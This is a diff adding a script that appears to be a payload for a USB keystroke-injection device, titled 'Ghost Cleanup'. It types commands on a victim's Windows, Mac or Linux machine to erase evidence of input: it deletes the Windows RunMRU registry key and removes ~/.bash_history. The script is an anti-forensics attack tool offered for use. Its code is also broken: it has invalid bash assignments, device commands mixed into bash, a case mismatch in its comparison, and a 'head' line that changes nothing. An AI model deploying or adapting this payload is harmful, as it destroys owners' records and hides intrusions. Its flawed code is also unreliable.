@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Title:         Ghost Cleanup
+# Author:        bg-wa
+# Version:       0.1
+# Target:        Windows, Mac, Linux
+#
+# Cleans the input history on Windows, Mac and Linux
+#
+
+# Exact number of lines to remove (MAC / LINUX)
+LINES = 0
+
+LED R
+ATTACKMODE HID
+
+PLATFORM_COMMAND = ""
+if [ ! -f ~/.bash_history ]; then
+    #WINDOWS
+    $PLATFORM_COMMAND = "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
+else
+    #MAC / LINUX
+    $PLATFORM_COMMAND = "terminal"
+
+fi
+
+
+DELAY 1000
+ALT F2
+DELAY 50
+GUI SPACE
+DELAY 50
+BACKSPACE
+DELAY 100
+STRING $PLATFORM_COMMAND
+
+
+if $LINES > 0 && $PLATFORM_COMMAND == "TERMINAL"
+    head -n -$LINES ~/.bash_history
+else
+    rm ~/.bash_history
+fi
+
+LED G
